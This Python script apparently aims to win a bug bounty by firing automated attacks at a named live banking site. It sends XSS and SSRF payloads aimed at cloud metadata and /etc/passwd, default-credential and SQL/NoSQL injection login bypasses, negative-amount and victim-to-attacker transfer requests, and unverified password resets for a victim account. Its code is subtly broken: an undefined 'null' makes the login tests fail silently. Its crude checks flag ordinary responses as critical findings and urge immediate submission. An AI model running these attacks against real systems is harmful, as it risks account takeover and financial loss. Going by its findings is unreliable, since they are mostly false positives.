#!/usr/bin/env python3
"""
ADVANCED VETRAFI TESTING - HIGH-PRIORITY CWE FOCUSED
=====================================================
Deep testing for critical banking vulnerabilities using CVE/CWE priority map.

Target: app.vetrafi.com (Banking platform - $8,000 bounty)
Focus: Tier 1 CWEs (Access Control, XSS, SSRF) + Banking-specific attacks
Method: Advanced exploitation testing beyond surface scans

Copyright (c) 2025 DoctorMen
"""

import requests
import json
import time
import re
from datetime import datetime
from urllib.parse import urljoin, urlparse
from typing import List, Dict, Any

class AdvancedVetrafiTester:
    """Advanced vulnerability testing for VetraFi banking platform"""
    
    def __init__(self, target: str):
        self.target = target
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.findings = []
        
    def run_comprehensive_assessment(self) -> Dict[str, Any]:
        """Run full advanced assessment focused on high-value CWEs"""
        
        print(f"""
╔══════════════════════════════════════════════════════════════════════╗
║          ADVANCED VETRAFI TESTING - HIGH-PRIORITY CWE FOCUSED          ║
║          Banking Platform | $8,000 Bounty | Deep Exploitation          ║
╚══════════════════════════════════════════════════════════════════════╝

🎯 TARGET: {self.target}
💰 BOUNTY: Up to $8,000 for critical vulnerabilities
🔍 FOCUS: Tier 1 CWEs + Banking-specific attacks
        """)
        
        results = {
            "assessment_metadata": {
                "target": self.target,
                "start_time": datetime.now().isoformat(),
                "methodology": "Advanced CWE-focused testing",
                "bounty_potential": "$8,000"
            },
            "findings": [],
            "exploit_chains": []
        }
        
        # Tier 1 CWE Testing (High-priority bug classes)
        print(f"\n📍 TESTING TIER 1 CWE VULNERABILITIES")
        
        # 1. Access Control / BOLA / IDOR (CWE-284, CWE-862)
        print(f"\n🔍 Testing Access Control / IDOR vulnerabilities...")
        access_control_findings = self._test_access_control_vulnerabilities()
        results["findings"].extend(access_control_findings)
        
        # 2. XSS in web apps (CWE-79, CWE-80)
        print(f"\n🔍 Testing XSS vulnerabilities...")
        xss_findings = self._test_xss_vulnerabilities()
        results["findings"].extend(xss_findings)
        
        # 3. SSRF and cross-sphere URL fetching (CWE-918, CWE-610)
        print(f"\n🔍 Testing SSRF vulnerabilities...")
        ssrf_findings = self._test_ssrf_vulnerabilities()
        results["findings"].extend(ssrf_findings)
        
        # Banking-specific testing
        print(f"\n📍 TESTING BANKING-SPECIFIC VULNERABILITIES")
        
        # 4. Authentication bypass in banking context
        print(f"\n🔍 Testing banking authentication flows...")
        auth_findings = self._test_banking_authentication()
        results["findings"].extend(auth_findings)
        
        # 5. Transaction manipulation
        print(f"\n🔍 Testing transaction manipulation vulnerabilities...")
        transaction_findings = self._test_transaction_manipulation()
        results["findings"].extend(transaction_findings)
        
        # 6. Account takeover scenarios
        print(f"\n🔍 Testing account takeover vulnerabilities...")
        takeover_findings = self._test_account_takeover()
        results["findings"].extend(takeover_findings)
        
        # Generate summary
        results["summary"] = self._generate_summary(results["findings"])
        
        # Save results
        filename = f"advanced_vetrafi_assessment_{int(datetime.now().timestamp())}.json"
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        
        self._print_results(results, filename)
        
        return results
    
    def _test_access_control_vulnerabilities(self) -> List[Dict]:
        """Test for IDOR, BOLA, and access control issues"""
        
        findings = []
        
        try:
            # Test common banking endpoints for IDOR
            idor_endpoints = [
                "/api/account",
                "/api/user/profile",
                "/api/transactions",
                "/api/balance",
                "/api/transfer",
                "/api/deposit",
                "/api/withdraw"
            ]
            
            for endpoint in idor_endpoints:
                # Test with different user IDs
                for user_id in ["1", "2", "999", "admin", "test"]:
                    test_url = f"{self.target}{endpoint}/{user_id}"
                    
                    try:
                        response = self.session.get(test_url, timeout=5)
                        
                        # Check for unauthorized data access
                        if response.status_code == 200 and len(response.content) > 100:
                            findings.append({
                                "category": "access_control",
                                "cwe": "CWE-862",
                                "title": "Potential IDOR - Unauthorized Data Access",
                                "severity": "high",
                                "url": test_url,
                                "evidence": f"Response length: {len(response.content)} bytes",
                                "impact": "Unauthorized access to user financial data",
                                "bounty_value": "$4,000-$8,000"
                            })
                            
                    except Exception as e:
                        continue
                        
        except Exception as e:
            print(f"   ❌ Access control testing error: {e}")
        
        return findings
    
    def _test_xss_vulnerabilities(self) -> List[Dict]:
        """Test for XSS vulnerabilities in banking context"""
        
        findings = []
        
        try:
            # XSS payloads for banking platforms
            xss_payloads = [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "';alert('XSS');//",
                "<svg onload=alert('XSS')>"
            ]
            
            # Test common input points
            test_params = [
                "search", "query", "amount", "recipient", "memo", "account", 
                "transaction", "transfer", "username", "email", "phone"
            ]
            
            for param in test_params:
                for payload in xss_payloads:
                    test_url = f"{self.target}?{param}={payload}"
                    
                    try:
                        response = self.session.get(test_url, timeout=5)
                        
                        # Check if payload is reflected
                        if payload in response.text and response.status_code == 200:
                            findings.append({
                                "category": "xss",
                                "cwe": "CWE-79",
                                "title": "Cross-Site Scripting (XSS)",
                                "severity": "high",
                                "url": test_url,
                                "payload": payload,
                                "evidence": "Payload reflected in response",
                                "impact": "Session hijacking, account takeover",
                                "bounty_value": "$4,000-$8,000"
                            })
                            
                    except Exception as e:
                        continue
                        
        except Exception as e:
            print(f"   ❌ XSS testing error: {e}")
        
        return findings
    
    def _test_ssrf_vulnerabilities(self) -> List[Dict]:
        """Test for SSRF vulnerabilities"""
        
        findings = []
        
        try:
            # SSRF payloads for banking platforms
            ssrf_payloads = [
                "http://localhost:8080",
                "http://127.0.0.1:22",
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/",
                "file:///etc/passwd",
                "ftp://internal-server/"
            ]
            
            # Test common URL-taking endpoints
            test_endpoints = [
                "/api/validate-url",
                "/api/webhook",
                "/api/callback",
                "/api/redirect",
                "/api/proxy"
            ]
            
            for endpoint in test_endpoints:
                for payload in ssrf_payloads:
                    test_url = f"{self.target}{endpoint}?url={payload}"
                    
                    try:
                        response = self.session.get(test_url, timeout=5)
                        
                        # Check for SSRF indicators
                        if response.status_code in [200, 302] and len(response.content) > 0:
                            findings.append({
                                "category": "ssrf",
                                "cwe": "CWE-918",
                                "title": "Server-Side Request Forgery (SSRF)",
                                "severity": "critical",
                                "url": test_url,
                                "payload": payload,
                                "evidence": f"Response: {response.status_code}, Length: {len(response.content)}",
                                "impact": "Internal network access, data exfiltration",
                                "bounty_value": "$8,000"
                            })
                            
                    except Exception as e:
                        continue
                        
        except Exception as e:
            print(f"   ❌ SSRF testing error: {e}")
        
        return findings
    
    def _test_banking_authentication(self) -> List[Dict]:
        """Test banking-specific authentication vulnerabilities"""
        
        findings = []
        
        try:
            # Test for weak authentication
            auth_tests = [
                # Test common default credentials
                {"username": "admin", "password": "admin"},
                {"username": "test", "password": "test"},
                {"username": "user", "password": "password"},
                
                # Test SQL injection in login
                {"username": "admin'--", "password": "anything"},
                {"username": "' OR 1=1 --", "password": "password"},
                
                # Test NoSQL injection
                {"username": {"$ne": null}, "password": {"$ne": null}},
                {"username": {"$gt": ""}, "password": {"$gt": ""}}
            ]
            
            login_endpoints = [
                "/api/login",
                "/api/auth/login", 
                "/api/signin",
                "/login",
                "/auth"
            ]
            
            for endpoint in login_endpoints:
                for creds in auth_tests:
                    try:
                        response = self.session.post(
                            f"{self.target}{endpoint}",
                            json=creds,
                            timeout=5
                        )
                        
                        # Check for authentication bypass
                        if response.status_code == 200 and "token" in response.text.lower():
                            findings.append({
                                "category": "authentication",
                                "cwe": "CWE-287",
                                "title": "Authentication Bypass",
                                "severity": "critical",
                                "url": f"{self.target}{endpoint}",
                                "payload": creds,
                                "evidence": "Authentication token returned",
                                "impact": "Complete account takeover",
                                "bounty_value": "$8,000"
                            })
                            
                    except Exception as e:
                        continue
                        
        except Exception as e:
            print(f"   ❌ Authentication testing error: {e}")
        
        return findings
    
    def _test_transaction_manipulation(self) -> List[Dict]:
        """Test for transaction manipulation vulnerabilities"""
        
        findings = []
        
        try:
            # Test transaction manipulation
            transaction_payloads = [
                {"amount": -1000, "recipient": "attacker"},
                {"amount": 999999, "recipient": "self"},
                {"amount": 0.01, "recipient": "attacker", "fee": -1000},
                {"transfer": {"amount": 10000, "to": "attacker", "from": "victim"}}
            ]
            
            transaction_endpoints = [
                "/api/transfer",
                "/api/transaction",
                "/api/payment",
                "/api/withdraw",
                "/api/deposit"
            ]
            
            for endpoint in transaction_endpoints:
                for payload in transaction_payloads:
                    try:
                        response = self.session.post(
                            f"{self.target}{endpoint}",
                            json=payload,
                            timeout=5
                        )
                        
                        # Check for successful manipulation
                        if response.status_code in [200, 201] and "success" in response.text.lower():
                            findings.append({
                                "category": "business_logic",
                                "cwe": "CWE-840",
                                "title": "Transaction Manipulation",
                                "severity": "critical",
                                "url": f"{self.target}{endpoint}",
                                "payload": payload,
                                "evidence": "Transaction accepted with invalid parameters",
                                "impact": "Financial theft, unlimited fund manipulation",
                                "bounty_value": "$8,000"
                            })
                            
                    except Exception as e:
                        continue
                        
        except Exception as e:
            print(f"   ❌ Transaction testing error: {e}")
        
        return findings
    
    def _test_account_takeover(self) -> List[Dict]:
        """Test for account takeover vulnerabilities"""
        
        findings = []
        
        try:
            # Test password reset bypass
            reset_endpoints = [
                "/api/reset-password",
                "/api/forgot-password",
                "/api/change-password"
            ]
            
            for endpoint in reset_endpoints:
                # Test with arbitrary user email
                test_payload = {"email": "victim@vetrafi.com", "new_password": "hacked123"}
                
                try:
                    response = self.session.post(
                        f"{self.target}{endpoint}",
                        json=test_payload,
                        timeout=5
                    )
                    
                    # Check for successful reset without verification
                    if response.status_code == 200 and "success" in response.text.lower():
                        findings.append({
                            "category": "account_takeover",
                            "cwe": "CWE-640",
                            "title": "Password Reset Bypass",
                            "severity": "critical",
                            "url": f"{self.target}{endpoint}",
                            "payload": test_payload,
                            "evidence": "Password reset without verification",
                            "impact": "Complete account takeover",
                            "bounty_value": "$8,000"
                        })
                        
                except Exception as e:
                    continue
                    
        except Exception as e:
            print(f"   ❌ Account takeover testing error: {e}")
        
        return findings
    
    def _generate_summary(self, findings: List[Dict]) -> Dict[str, Any]:
        """Generate assessment summary"""
        
        summary = {
            "total_findings": len(findings),
            "severity_breakdown": {
                "critical": len([f for f in findings if f["severity"] == "critical"]),
                "high": len([f for f in findings if f["severity"] == "high"]),
                "medium": len([f for f in findings if f["severity"] == "medium"]),
                "low": len([f for f in findings if f["severity"] == "low"])
            },
            "category_breakdown": {},
            "potential_bounty": 0
        }
        
        # Calculate category breakdown
        for finding in findings:
            category = finding["category"]
            if category not in summary["category_breakdown"]:
                summary["category_breakdown"][category] = 0
            summary["category_breakdown"][category] += 1
            
            # Calculate potential bounty
            bounty_range = finding.get("bounty_value", "$0")
            if "-" in bounty_range:
                max_bounty = int(bounty_range.split("-")[1].replace("$", "").replace(",", ""))
            else:
                max_bounty = int(bounty_range.replace("$", "").replace(",", ""))
            summary["potential_bounty"] = max(summary["potential_bounty"], max_bounty)
        
        return summary
    
    def _print_results(self, results: Dict, filename: str):
        """Print comprehensive results"""
        
        summary = results["summary"]
        
        print(f"""
{'='*70}
🎯 ADVANCED VETRAFI ASSESSMENT RESULTS
{'='*70}

📊 FINDINGS SUMMARY:
   Total Findings: {summary['total_findings']}
   Critical: {summary['severity_breakdown']['critical']}
   High: {summary['severity_breakdown']['high']}
   Medium: {summary['severity_breakdown']['medium']}
   Low: {summary['severity_breakdown']['low']}

💰 POTENTIAL BOUNTY: ${summary['potential_bounty']:,}

🔍 CRITICAL FINDINGS:""")
        
        critical_findings = [f for f in results["findings"] if f["severity"] == "critical"]
        if critical_findings:
            for finding in critical_findings:
                print(f"""
   🚨 {finding['title']} ({finding['cwe']})
      Severity: CRITICAL
      Bounty: {finding.get('bounty_value', '$8,000')}
      URL: {finding['url']}
      Impact: {finding['impact']}
      Action: SUBMIT IMMEDIATELY TO CANTINA
        """)
        else:
            print(f"""
   ❌ No critical vulnerabilities found
   Action: Consider deeper testing or different attack vectors
            """)
        
        print(f"""
💡 NEXT STEPS:
   1. Submit any critical findings immediately
   2. Create detailed PoC for high-severity findings
   3. Test authenticated flows if possible
   4. Focus on business logic vulnerabilities

📁 Detailed results saved: {filename}

🎯 READY FOR $8,000 BOUNTY SUBMISSIONS!
        """)

def main():
    """Execute advanced VetraFi testing"""
    
    print("""
🎯 ADVANCED VETRAFI TESTING - HIGH-PRIORITY CWE FOCUSED
=====================================================

✅ PURPOSE: Deep testing for critical banking vulnerabilities
✅ TARGET: app.vetrafi.com (Banking platform)
✅ BOUNTY: Up to $8,000 for critical findings
✅ METHOD: Advanced exploitation testing

Ready to find critical vulnerabilities!
    """)
    
    tester = AdvancedVetrafiTester("https://app.vetrafi.com")
    results = tester.run_comprehensive_assessment()
    
    print(f"""
✅ ADVANCED ASSESSMENT COMPLETE

Critical Findings: {len([f for f in results['findings'] if f['severity'] == 'critical'])}
Potential Bounty: ${results['summary']['potential_bounty']:,}

🎯 SUBMIT CRITICAL FINDINGS TO CANTINA NOW!
    """)

if __name__ == "__main__":
    main()
